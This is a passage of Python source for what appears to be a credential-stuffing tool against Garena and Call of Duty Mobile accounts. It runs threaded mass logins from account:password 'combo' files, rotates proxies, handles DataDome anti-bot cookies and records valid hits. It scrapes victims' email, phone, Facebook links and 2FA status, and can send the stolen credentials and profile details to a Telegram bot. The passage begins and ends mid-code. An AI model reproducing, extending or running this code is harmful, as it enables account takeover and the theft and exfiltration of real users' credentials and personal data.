        vl["done"] += 1
        done_now = vl["done"]
    
    _print_line(result, account, password, note)
    if done_now % 5 == 0 or done_now == total:
        _print_live_stats()

def validator_check():
    console = Console()
    clear_screen()
    display_banner()
    
    console.print(Panel("[yellow]⚠ Use a VPN before validating accounts.[/yellow]\n[white]• ExpressVPN or any trusted VPN is recommended.[/white]\n[white]• Validator Mode performs login verification only.[/white]\n[white]• No CODM or Garena account information is fetched.[/white]\n[white]• Results will be saved inside:[/white] [cyan]Results/validator_*[/cyan]", 
                       title="[bold red]VALIDATOR MODE[/bold red]", border_style="bright_black", box=box.ROUNDED, padding=(1,2), expand=False))
    
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log("ERROR", "No .txt files found in Combo folder.")
        input(f"\n{GRAY}[Press Enter to return to menu]{RESET} ")
        return
    
    selected_file = select_input_file_flow(show_auto_remove=False)
    if not selected_file:
        _log("ERROR", "No file selected.")
        input(f"\n{GRAY}[Press Enter to return to menu]{RESET} ")
        return
    
    accounts = []
    with open(selected_file, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))
    
    if not accounts:
        _log("ERROR", "No valid account:password lines found.")
        input(f"\n{GRAY}[Press Enter to return to menu]{RESET} ")
        return
    
    info_tbl = Table(box=box.ROUNDED, border_style="bright_black", show_header=False, expand=False)
    info_tbl.add_column(style="cyan", min_width=18)
    info_tbl.add_column(style="white")
    info_tbl.add_row("Combo File", Path(selected_file).name)
    info_tbl.add_row("Accounts", f"{len(accounts):,}")
    console.print(info_tbl)
    console.print()
    
    while True:
        try:
            thread_tbl = Table(box=box.ROUNDED, border_style="bright_black", show_header=False, expand=False)
            thread_tbl.add_column(style="cyan", min_width=18)
            thread_tbl.add_column(style="white")
            thread_tbl.add_row("Recommended", "5 - 10")
            thread_tbl.add_row("Maximum", "50")
            thread_tbl.add_row("Default", str(DEFAULT_THREADS))
            console.print(thread_tbl)
            
            raw_t = input(f"{CYAN}➤ Enter Threads (1-20){RESET} ").strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 50:
                break
            _log("ERROR", "Threads must be between 1 and 20.")
        except ValueError:
            _log("ERROR", "Please enter a valid number.")
    
    _log("SUCCESS", f"Using {num_threads} thread(s).")
    
    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path("Results") / f"validator_{stem}_{ts_str}"
    out_dir.mkdir(parents=True, exist_ok=True)
    
    valid_path = out_dir / "valid.txt"
    invalid_path = out_dir / "invalid.txt"
    error_path = out_dir / "errors.txt"
    
    valid_fh = open(valid_path, "a", encoding="utf-8", buffering=1)
    invalid_fh = open(invalid_path, "a", encoding="utf-8", buffering=1)
    error_fh = open(error_path, "a", encoding="utf-8", buffering=1)
    
    console.print(Panel(f"[green]Output Folder[/green]\n[cyan]{out_dir}[/cyan]", border_style="green", expand=False))
    
    vl = {"valid": 0, "invalid": 0, "error": 0, "done": 0}
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    print_lock = threading.Lock()
    
    start_time = time.time()
    total = len(accounts)
    cookie_manager_val = CookieManager()
    _tl = threading.local()
    
    def _get_sess():
        if not hasattr(_tl, "s"):
            s = requests.Session()
            dm = DataDomeManager()
            cks = cookie_manager_val.get_valid_cookies()
            
            if cks:
                applyck(s, "; ".join(cks))
                for part in cks[-1].split(";"):
                    part = part.strip()
                    if part.startswith("datadome="):
                        dm.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = get_datadome_cookie(s, proxies=dict(s.proxies) if s.proxies else None)
                if dd:
                    dm.set_datadome(dd)
                    s.cookies.set("datadome", dd, domain=".garena.com")
            
            _tl.s, _tl.dm = s, dm
        return _tl.s, _tl.dm
    
    def _print_line(tag, account, password, note=""):
        if tag == "valid":
            console.print(f"[bold green]✔ VALID[/bold green] [white]{account}:{password}[/white]")
        elif tag == "invalid":
            console.print(f"[bold red]✖ INVALID[/bold red] [grey70]{account}:{password}[/grey70] [red]{(note or 'Incorrect Password').upper()}[/red]")
        else:
            console.print(f"[bold yellow]⚠ ERROR[/bold yellow] [grey70]{account}:{password}[/grey70] [yellow]{note}[/yellow]")
    
    def _print_live_stats():
        with st_lock:
            v, iv, er, dn = vl["valid"], vl["invalid"], vl["error"], vl["done"]
        elapsed = max(time.time() - start_time, 0.001)
        speed = dn / elapsed
        eta = (total - dn) / speed if speed else 0
        
        tbl = Table(box=box.ROUNDED, border_style="bright_black", show_header=False, expand=False)
        tbl.add_column(style="cyan", min_width=18)
        tbl.add_column(style="white")
        tbl.add_row("Processed", f"{dn:,}/{total:,}")
        tbl.add_row("Valid", f"[green]{v}[/green]")
        tbl.add_row("Invalid", f"[red]{iv}[/red]")
        tbl.add_row("Errors", f"[yellow]{er}[/yellow]")
        tbl.add_row("Speed", f"{speed:.2f} acc/s")
        tbl.add_row("ETA", f"{int(eta//60)}m {int(eta%60):02d}s")
        console.print(tbl)
    
    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        result, note = "error", ""
        
        try:
            session, dm = _get_sess()
            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
            if not v1 or not v2:
                result, note = "invalid", "Account Not Found"
            else:
                sso_key = login(session, account, password, v1, v2)
                result, note = ("valid", "") if sso_key else ("invalid", "Incorrect Password")
        except Exception as e:
            result, note = "error", type(e).__name__
        
        with file_lock:
            if result == "valid":
                valid_fh.write(f"{account}:{password}\n")
            elif result == "invalid":
                invalid_fh.write(f"{account}:{password}\n")
            else:
                error_fh.write(f"{account}:{password} | {note}\n")
        
        with st_lock:
            vl[result] += 1
            vl["done"] += 1
            done_now = vl["done"]
        
        _print_line(result, account, password, note)
        if done_now % 5 == 0 or done_now == total:
            _print_live_stats()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except:
                    pass
    except KeyboardInterrupt:
        stop_ev.set()
        _log("WARNING", "Stopping validator...")
    finally:
        valid_fh.close()
        invalid_fh.close()
        error_fh.close()
    
    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        valid, invalid, errors, done = vl["valid"], vl["invalid"], vl["error"], vl["done"]
    
    summary_tbl = Table(title="[bold cyan]VALIDATOR SUMMARY[/bold cyan]", box=box.ROUNDED, border_style="bright_black", show_header=False, expand=False)
    summary_tbl.add_column(style="cyan", min_width=20)
    summary_tbl.add_column(style="white", min_width=18)
    for label, value in [("Total Accounts", f"{total:,}"), ("Processed", f"{done:,}"), ("Valid", f"[green]{valid}[/green]"), 
                        ("Invalid", f"[red]{invalid}[/red]"), ("Errors", f"[yellow]{errors}[/yellow]"), 
                        ("Elapsed", f"{elapsed:.2f}s"), ("Speed", f"{done / elapsed:.2f} acc/s")]:
        summary_tbl.add_row(label, value)
    
    console.print()
    console.print(summary_tbl)
    
    output_tbl = Table(title="[bold green]OUTPUT FILES[/bold green]", box=box.ROUNDED, border_style="green", show_header=False, expand=False)
    output_tbl.add_column(style="cyan", min_width=12)
    output_tbl.add_column(style="white")
    for label, path in [("✔ Valid", valid_path), ("✖ Invalid", invalid_path), ("⚠ Errors", error_path)]:
        output_tbl.add_row(label, str(path))
    
    console.print()
    console.print(output_tbl)
    console.print(Panel("[bold magenta]Powered by kai[/bold magenta]", border_style="magenta", expand=False))
    input(f"\n{GRAY}[Press Enter to return to menu]{RESET} ")

def bulk_check():
    clear_screen()
    display_banner()
    
    file_manager = AccountFileManager()
    selected_file, auto_remove = select_input_file_flow(show_auto_remove=True)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        return
    
    if console.input("[yellow]➤ REMOVE DUPLICATE LINES? [Y/N]: [/yellow]").strip().lower() == 'y':
        prompt_for_duplicate_removal(selected_file)
    
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                acc, pwd = clean_account_line(line)
                if acc and pwd:
                    accounts.append(f"{acc}:{pwd}")
        _log('SUCCESS', f'File loaded: [bold]{len(accounts):,}[/bold] accounts')
    except:
        _log('ERROR', 'Could not read file.')
        return
    
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    
    _log('INFO', f'Total accounts queued: [bold]{len(accounts):,}[/bold]')
    
    
    proxy_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    proxy_table.add_column("ID", width=6)
    proxy_table.add_column("Option")
    proxy_table.add_row("[cyan]1[/cyan]", "USE PROXIES.TXT")
    proxy_table.add_row("[cyan]2[/cyan]", "NO PROXY (Recommended)")
    console.print(Panel(proxy_table, title="[yellow]PROXY CONFIGURATION[/yellow]", border_style="yellow", padding=(0,1)))
    
    proxy_manager = None
    while True:
        choice = console.input("[cyan]➤ Choice: [/cyan]").strip()
        if choice in ("1","2"):
            break
        _log('ERROR', 'Invalid choice. Select 1 or 2.')
    
    if choice == "1" and os.path.exists("proxies.txt"):
        proxy_manager = ProxyManager()
        if proxy_manager.is_loaded():
            _log('SUCCESS', f'Loaded [bold]{len(proxy_manager.proxies)}[/bold] proxies')
        else:
            _log('WARNING', 'No valid proxies found.')
            proxy_manager = None
    elif choice == "1":
        _log('WARNING', 'proxies.txt not found! Running without proxies.')
    
    max_threads = 30 if proxy_manager else 50
    
    
    thread_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    thread_table.add_column("Threads", width=12)
    thread_table.add_column("Speed")
    thread_table.add_row("[green]1-8[/green]", "Safe (Recommended)")
    thread_table.add_row("[yellow]9-20[/yellow]", "Medium Speed")
    thread_table.add_row("[cyan]21-30[/cyan]" if proxy_manager else "[cyan]11-20[/cyan]", "Fast (Proxy Only)" if proxy_manager else "Fast")
    console.print(Panel(thread_table, title="[yellow]THREAD CONFIGURATION[/yellow]", border_style="yellow", padding=(0,1)))
    
    while True:
        try:
            raw = console.input(f"[cyan]➤ Threads 1-{max_threads} (default {DEFAULT_THREADS}): [/cyan]").strip()
            num_threads = DEFAULT_THREADS if not raw else int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log('ERROR', f'Enter value between 1 and {max_threads}')
        except ValueError:
            _log('ERROR', 'Invalid number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    
 
    global CHECK_OTHER_GAMES
    game_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    game_table.add_column("Info")
    game_table.add_row("[magenta]OTHER GAMES CHECK[/magenta]")
    game_table.add_row("AOV / ROV / Free Fire / Delta Force")
    game_table.add_row("[yellow]Adds ~1-3 seconds per account[/yellow]")
    game_table.add_row("Each game saved to separate result file")
    console.print(Panel(game_table, title="[magenta]GAME CONNECTIONS[/magenta]", border_style="magenta", padding=(0,1)))
    
    CHECK_OTHER_GAMES = console.input("[magenta]◇ Check other games? (y/N): [/magenta]").strip().lower() == "y"
    _log('SUCCESS' if CHECK_OTHER_GAMES else 'INFO', 
         'Will scan all Garena game connections' if CHECK_OTHER_GAMES else 'CODM only — skipping other game checks')
    
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(accounts)
    
   
    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 
                        'clean': clean_range, 'nc': nc_range}, f)
        except:
            pass
    
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as f:
                data = _j.load(f)
            return data if data.get('token') and data.get('chat_id') else None
        except:
            return None
    
    def _build_tg_message(acc, pwd, ad, is_clean_hit):
        lvl = ad.get('codm_level', 0)
        region = ad.get('codm_region', 'N/A')
        nick = ad.get('codm_nickname', 'N/A')
        uid = ad.get('uid', 'N/A')
        country = ad.get('country', 'N/A')
        fb = ad.get('fb_info', 'N/A')
        fb_link = ad.get('fb_link', 'N/A')
        shell = ad.get('shell_balance', 0)
        email_d = ad.get('email_display', 'N/A')
        mobile = ad.get('formatted_mobile', 'N/A')
        login_d = ad.get('last_login_date', 'N/A')
        login_w = ad.get('last_login_where', 'N/A')
        status = ad.get('account_status', 'N/A')
        tag = '✨ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
        lines = [
            f"{'✨ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}",
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Credential: {acc}:{pwd}',
            f'Status: {tag}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Nickname: {nick}',
            f'UID: {uid}',
            f'Level: {lvl}',
            f'Region: {region}',
            f'Country: {country}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Email: {email_d}',
            f'Mobile: {mobile}',
            f'Facebook: {fb}'
        ]
        if fb_link != 'N/A':
            lines.append(f'FB Link: {fb_link}')
        lines += [
            f'Shells: {shell}',
            f'Acc Status: {status}',
            f'Last Login: {login_d}',
            f'Login Via: {login_w}',
            f'━━━━━━━━━━━━━━━━━━━━━━━━━━',
            f'Powered by: @legitkaiii'
        ]
        return '\n'.join(lines)
    
    def _send_tg(token, chat_id, text, silent=False):
        try:
            import urllib.request as _ur, urllib.parse as _up
            payload = {'chat_id': chat_id, 'text': text, 'disable_notification': silent, 'parse_mode': 'HTML'}
            data = _up.urlencode(payload).encode()
            req = _ur.Request(f'https://api.telegram.org/bot{token}/sendMessage', data=data, method='POST')
            _ur.urlopen(req, timeout=8)
        except Exception:
            pass
    
    def _maybe_send_tg(account_data):
        if not TG_ENABLED:
            return
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        msg = _build_tg_message(account_data.get('account', ''), account_data.get('password', ''), account_data, is_clean)
        
        if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
            threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
        elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
            threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
    
    saved_tg = _tg_load()
    
 
    tg_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    tg_table.add_column("ID", width=6)
    tg_table.add_column("Action")
    for opt, desc in [("1", "Send Clean hits only"), ("2", "Send Not-Clean hits only"), 
                      ("3", "Send Both Clean + Not-Clean"), ("4", "No Telegram")]:
        tg_table.add_row(f"[yellow]{opt}[/yellow]", desc)
    
    console.print(Panel(tg_table, title="[yellow]TELEGRAM NOTIFICATION[/yellow]", border_style="yellow", padding=(0,1)))
    
   
    tg_choice = ""
    while tg_choice not in ("1", "2", "3", "4"):
        tg_choice = console.input("[yellow]➤ Choice: [/yellow]").strip()
    
    TG_ENABLED = tg_choice != "4"
    TG_SEND_CLEAN = tg_choice in ("1", "3")
    TG_SEND_NOTCLEAN = tg_choice in ("2", "3")
    
    TG_BOT_TOKEN = TG_CHAT_ID = ""
    TG_LVL_MIN_CLEAN = TG_LVL_MIN_NOTCLEAN = 0
    TG_LVL_MAX_CLEAN = TG_LVL_MAX_NOTCLEAN = 400
    
    if TG_ENABLED:
        print()
        if saved_tg:
            masked = f"...{saved_tg['token'][-6:]}" if len(saved_tg['token']) > 6 else "******"
            console.print(f"[green]✔ Saved config found[/green] [grey50]Token: {masked} | Chat: {saved_tg['chat_id']}[/grey50]")
            
            if console.input("[yellow]➤ Use saved config? (y/n): [/yellow]").strip().lower() == "y":
                TG_BOT_TOKEN = saved_tg['token']
                TG_CHAT_ID = saved_tg['chat_id']
                clean = saved_tg.get('clean', [0,9999])
                nc = saved_tg.get('nc', [0,9999])
                TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = clean[0], clean[1]
                TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = nc[0], nc[1]
                _log('SUCCESS', 'Using saved config.')
            else:
                saved_tg = None
        
        if not saved_tg:
            TG_BOT_TOKEN = console.input("[yellow]➤ Bot Token: [/yellow]").strip()
            TG_CHAT_ID = console.input("[yellow]➤ Chat ID: [/yellow]").strip()
    
    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg
    
    
    summary = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0, 1))
    summary.add_column("Label", style="bold white", width=25)
    summary.add_column("Value", justify="left")
    
    summary.add_row("📦 ACCOUNTS LOADED", f"[green]{len(accounts):,}[/green]")
    summary.add_row("🧵 THREADS CHOSEN", f"[cyan]{num_threads}[/cyan]")
    summary.add_row("🍪 VALID COOKIES", f"[yellow]{len(cookie_manager.get_valid_cookies())}[/yellow]")
    summary.add_row("🌐 PROXIES", f"[green]{len(proxy_manager.proxies)}[/green]" if proxy_manager else "[red]DISABLED[/red]")
    summary.add_row("🗑 AUTO-REMOVE", "[green]ENABLED[/green]" if auto_remove else "[red]DISABLED[/red]")
    
    console.print(Panel(summary, title="[bold yellow]PRE-CHECK SUMMARY[/bold yellow]", border_style="bright_yellow", box=box.ROUNDED, padding=(1, 2)))
    
    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    
    _suppress_ip_prints = True
    _ip_block_callback = lambda blocked: None
    
    _thread_local = threading.local()
    print("\n" * GARENA_UI_HEIGHT)
    
    def _get_thread_resources():
        if not hasattr(_thread_local, "session") or not hasattr(_thread_local, "datadome"):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDomeManager()
            
            if proxy_manager and proxy_manager.is_loaded():
                _thread_local.session.proxies.update(proxy_manager.get_next())
            
            proxy_dict = dict(_thread_local.session.proxies) if proxy_manager and proxy_manager.is_loaded() else None
            valid_cookies = cookie_manager.get_valid_cookies()
            
            if valid_cookies:
                applyck(_thread_local.session, "; ".join(valid_cookies))
                for part in valid_cookies[-1].split(";"):
                    if part.strip().startswith("datadome="):
                        _thread_local.datadome.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        
        return _thread_local.session, _thread_local.datadome
    
    def _worker(account_line):
        nonlocal overall_done
        if not account_line or ":" not in account_line:
            return ("DONE", account_line, {})
        
        try:
            account, password = account_line.split(":", 1)
            account, password = account.strip(), password.strip()
            session, datadome_mgr = _get_thread_resources()
            
            with stats_lock:
                overall_done += 1
                live_stats.current_account = account
            
            status, account_data = processaccount(session, account, password, cookie_manager, datadome_mgr, 
                                                 live_stats, results_manager, file_manager, selected_file, 
                                                 auto_remove, suppress_print=True, proxy_manager=proxy_manager)
            
            with print_lock:
                if status == "DONE" and account_data:
                    console.print(format_hit(username=account_data.get("username", account), password=password,
                               shell=account_data.get("shell_balance", 0), level=account_data.get("codm_level", 0),
                               region=account_data.get("codm_region", "N/A"), nickname=account_data.get("codm_nickname", "N/A"),
                               uid=account_data.get("uid", "N/A"), mobile=account_data.get("formatted_mobile", "N/A"),
                               email=account_data.get("email_display", "N/A"), email_ver="yes" if account_data.get("email_verified") else "no",
                               two_step="Yes" if account_data.get("two_step_verify") else "No", auth_app="Yes" if account_data.get("authenticator_app") else "No",
                               country=account_data.get("country", "N/A"), last_login=account_data.get("last_login_date", "Unknown"),
                               is_clean=account_data.get("is_clean", False), fb_link=account_data.get("fb_link", "N/A"),
                               fb_info=account_data.get("fb_info", "NOT CONNECTED"), last_login_ip=account_data.get("last_login_ip", "Unknown"),
                               has_codm=account_data.get("has_codm", False), connected_games=[], colorized=False))
                else:
                    console.print(f"[bold cyan]➤[/bold cyan] [white]{account}[/white] [dim]→[/dim] [bold red]✗ Invalid - invalid[/bold red]")
            
            return status, account, account_data or {}
        except Exception:
            return "ERROR", account_line, {}
    
    def _wrapped_worker(account_line):
        with index_lock:
            account_index_counter[0] += 1
        
        retry_count = 0
        while True:
            status, acc_name, account_data = _worker(account_line)
            if status != 'IP_CHANGED':
                break
            if hasattr(_thread_local, 'session'):
                _thread_local.session.close()
                del _thread_local.session
            if hasattr(_thread_local, 'datadome'):
                del _thread_local.datadome
            retry_count += 1
            if retry_count >= 3:
                break
            time.sleep(2)
        
        try:
            stats = live_stats.get_stats()
            if live:
                live.update(build_live_stats_ui(stats))
        except:
            pass
        
        try:
            if account_data:
                _maybe_send_tg(account_data)
        except:
            pass
        
        return status, acc_name, account_data or {}
    
    from rich.live import Live
    live = Live(build_live_stats_ui(live_stats.get_stats()), console=console, refresh_per_second=4)
    live.start()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    live.stop()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()
    
    stats = live_stats.get_stats()
    display_summary(stats.get('checked', 0), stats.get('invalid', 0) + stats.get('error', 0), stats.get('valid', 0),
                   live_stats.categorized_levels, live_stats.countries, len(accounts), 
                   live_stats.highest_clean_level, live_stats.highest_nc_level, live_stats.highest_shell)
    
    results_manager.db_flush_final()
    _flush_auto_remove(file_manager, selected_file, force=True)
    print(f'  {GRAY}Results saved in real-time to Results/{RESET}')
    print()
    input(f'  {GRAY}[Press Enter to return to menu]{RESET} ')


def single_check():
    clear_screen()
    display_banner()
    
    from rich.panel import Panel
    from rich.table import Table
    from rich.console import Console
    from rich import box
    
    console = Console()
    w = 60
    
    # Header Panel
    console.print(Panel(
        "[magenta]SINGLE ACCOUNT CHECK[/magenta]\n[gray]Enter credentials below[/gray]",
        title="[bold magenta]Single Check[/bold magenta]",
        border_style="magenta",
        box=box.ROUNDED,
        padding=(1, 2)
    ))
    console.print()
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    
    while True:
        live_stats = LiveStats()
        live_stats.total_accounts = 1
        session = requests.Session()
        
        valid_cookies = cookie_manager.get_valid_cookies()
        if valid_cookies:
            applyck(session, '; '.join(valid_cookies))
            for part in valid_cookies[-1].split(';'):
                part = part.strip()
                if part.startswith('datadome='):
                    datadome_manager.set_datadome(part.split('=', 1)[1].strip())
                    break
        else:
            proxy_dict = dict(session.proxies) if session.proxies else None
            datadome = get_datadome_cookie(session, proxies=proxy_dict)
            if datadome:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)
        
   
        cred_table = Table(box=box.ROUNDED, show_header=False, expand=False)
        cred_table.add_column(style="cyan", width=20)
        cred_table.add_column(style="white")
        
        account = console.input(f"[cyan]➤ Username/Email: [/cyan]").strip()
        if not account:
            _log('ERROR', 'Username/Email cannot be empty.')
            console.print()
            continue
        
        password = console.input(f"[cyan]➤ Password: [/cyan]").strip()
        if not password:
            _log('ERROR', 'Password cannot be empty.')
            console.print()
            continue
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        single_check_path = Path('SingleCheck')
        results_manager = ResultsManager(combo_file_path=single_check_path)
        import shutil
        
        default_results_folder = Path(f'Results/output_SingleCheck_{results_manager.timestamp}')
        if default_results_folder.exists():
            shutil.rmtree(default_results_folder)
        
        results_manager.base_dir = Path(f'Single Check Output/{timestamp}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
        
        _log('INFO', f'Checking: [bold]{account}[/bold]…')
        console.print()
        
        
        console.print(Panel(
            f"[cyan]Processing account: [bold]{account}[/bold][/cyan]",
            border_style="yellow",
            box=box.ROUNDED,
            padding=(1, 2)
        ))
        console.print()
        
        status, account_data = processaccount(
            session, account, password, cookie_manager, datadome_manager,
            live_stats, results_manager, file_manager=None, combo_file_path=None,
            auto_remove=False, use_elegant_display=True
        )
        
        
        if account_data:
            result_table = Table(box=box.ROUNDED, title="[bold green]Account Details[/bold green]", border_style="green")
            result_table.add_column("Field", style="cyan", width=20)
            result_table.add_column("Value", style="white")
            
            fields = [
                ("Username", account_data.get("username", "N/A")),
                ("Level", account_data.get("codm_level", 0)),
                ("Region", account_data.get("codm_region", "N/A")),
                ("Nickname", account_data.get("codm_nickname", "N/A")),
                ("UID", account_data.get("uid", "N/A")),
                ("Country", account_data.get("country", "N/A")),
                ("Shell Balance", account_data.get("shell_balance", 0)),
                ("Clean", "✅ Yes" if account_data.get("is_clean") else "❌ No"),
                ("Has CODM", "✅ Yes" if account_data.get("has_codm") else "❌ No"),
                ("Email Verified", "✅ Yes" if account_data.get("email_verified") else "❌ No"),
                ("2-Step Auth", "✅ Yes" if account_data.get("two_step_verify") else "❌ No"),
                ("Authenticator", "✅ Yes" if account_data.get("authenticator_app") else "❌ No"),
                ("Facebook Link", account_data.get("fb_link", "N/A")),
                ("Last Login", account_data.get("last_login_date", "Unknown")),
            ]
            
            for field, value in fields:
                result_table.add_row(field, str(value))
            
            console.print(result_table)
        else:
            console.print(Panel(
                "[bold red]✗ No account data retrieved[/bold red]",
                border_style="red",
                box=box.ROUNDED
            ))
        
        console.print()
        
       
        save_response = console.input(f"[yellow]➤ Save result? (y/n): [/yellow]").strip().lower()
        if save_response == 'y':
            _log('SAVE', f'Saved to [bold]{results_manager.base_dir}[/bold]')
            console.print(Panel(
                f"[green]✔ Results saved to:[/green]\n[cyan]{results_manager.base_dir}[/cyan]",
                border_style="green",
                box=box.ROUNDED
            ))
        else:
            try:
                if results_manager.base_dir.exists():
                    shutil.rmtree(results_manager.base_dir)
                single_check_parent = Path('Single Check Output')
                if single_check_parent.exists() and (not any(single_check_parent.iterdir())):
                    single_check_parent.rmdir()
                default_results_folder = Path(f'Results/output_SingleCheck_{results_manager.timestamp}')
                if default_results_folder.exists():
                    shutil.rmtree(default_results_folder)
                results_folder = Path('Results')
                if results_folder.exists() and (not any(results_folder.iterdir())):
                    results_folder.rmdir()
                _log('INFO', 'Result discarded — not saved.')
                console.print("[yellow]⚠ Result discarded[/yellow]")
            except Exception:
                _log('ERROR', 'Error cleaning up temporary files.')
                console.print("[red]✗ Error cleaning up files[/red]")
        
        console.print()
        
       
        continue_response = console.input(f"[magenta]➤ Check another? (y/n): [/magenta]").strip().lower()
        if continue_response != 'y':
            console.print(Panel(
                "[bold magenta]Exiting Single Check[/bold magenta]",
                border_style="magenta",
                box=box.ROUNDED
            ))
            break
        
        session.close()
        _log('INFO', 'Refreshing session for next check…')
        time.sleep(1)
        clear_screen()
        display_banner()

def leak_searcher_menu():
    clear_screen()
    display_banner()
    
    console = Console()
    
    console.print(Panel(
        "[yellow]LEAK SEARCHER[/yellow]\n"
        "[white]Check if accounts have been checked before[/white]\n"
        "[white]Search single account or combo file[/white]\n"
        "[white]Results saved to [cyan]LeakResults/[/cyan] folder[/white]\n"
        "[red]Accounts marked as leaked may be compromised[/red]",
        title="[bold red]LEAK SEARCHER[/bold red]",
        border_style="bright_black",
        box=box.ROUNDED,
        padding=(1, 2),
        expand=False,
    ))
    
    db = DatabaseComparison()
    db.display_database_stats()
    
    print()
    
    mode_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    mode_table.add_column("ID", width=6)
    mode_table.add_column("Option")
    mode_table.add_row("[cyan]1[/cyan]", "Search Single Combo")
    mode_table.add_row("[cyan]2[/cyan]", "Search Combo File")
    mode_table.add_row("[cyan]3[/cyan]", "Back to Main Menu")
    
    console.print(Panel(mode_table, title="[yellow]SELECT SEARCH MODE[/yellow]", border_style="yellow", padding=(0,1)))
    
    while True:
        choice = console.input("[cyan]Choice: [/cyan]").strip()
        if choice in ("1", "2", "3"):
            break
        _log('ERROR', 'Invalid choice. Select 1, 2, or 3.')
    
    if choice == "3":
        return
    
    if choice == "1":
        console.print()
        combo = console.input("[yellow]Enter account:password combo: [/yellow]").strip()
        if not combo or ':' not in combo:
            _log('ERROR', 'Invalid format. Use account:password')
            input(f"\n{GRAY}[Press Enter to continue]{RESET} ")
            return
        
        _log('INFO', f'Checking combo: [bold]{combo}[/bold]')
        result = db.check_single_leak(combo)
        
        if result['leaked'] is None:
            if result.get('error') == 'Database not found':
                _log('INFO', 'No database yet. Run Bulk Check or Validator first.')
            else:
                _log('ERROR', f'Database error: {result.get("error", "Unknown")}')
        elif result['leaked']:
            checked_at = result.get('checked_at', 'Unknown')
            console.print(Panel(
                f"[bold red]LEAKED[/bold red]\n"
                f"Combo: [yellow]{combo}[/yellow]\n"
                f"First checked: [cyan]{checked_at}[/cyan]\n\n"
                f"[yellow]This account has been checked before![/yellow]",
                title="[bold red]LEAK DETECTED[/bold red]",
                border_style="red",
                box=box.ROUNDED
            ))
        else:
            console.print(Panel(
                f"[bold green]FRESH[/bold green]\n"
                f"Combo: [yellow]{combo}[/yellow]\n\n"
                f"[green]This combo has not been checked before.[/green]",
                title="[bold green]FRESH ACCOUNT[/bold green]",
                border_style="green",
                box=box.ROUNDED
            ))
        
        input(f"\n{GRAY}[Press Enter to continue]{RESET} ")
    
    elif choice == "2":
        available_files = find_and_list_account_files()
        if not available_files:
            _log('ERROR', 'No combo files found in Combo folder.')
            input(f"\n{GRAY}[Press Enter to continue]{RESET} ")
            return
        
        selected_file = select_input_file_flow(show_auto_remove=False)
